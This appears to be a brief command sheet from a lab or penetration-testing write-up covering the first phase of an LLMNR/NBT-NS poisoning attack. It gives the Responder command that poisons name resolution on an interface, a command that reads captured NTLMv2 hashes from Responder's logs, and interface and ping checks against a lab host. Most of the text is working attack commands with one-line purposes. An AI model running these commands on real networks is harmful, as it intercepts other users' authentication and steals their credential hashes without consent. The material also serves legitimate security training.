# 💻 Phase 1 Commands — LLMNR/NBT-NS Poisoning

## Start Responder

```bash
sudo responder -I eth0 -dwv
```

### Purpose

Starts Responder in analysis and poisoning mode to intercept LLMNR and NBT-NS authentication requests.

---

## Verify Captured Hashes

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.10.100.txt
```

### Purpose

Displays captured NTLMv2 authentication material stored by Responder.

---

## Network Interface Verification

```bash
ip a
```

### Purpose

Verifies the correct network interface connected to the internal lab environment.

---

## Optional Connectivity Validation

```bash
ping 192.168.10.100
```

### Purpose

Confirms connectivity between attacker system and target workstation.
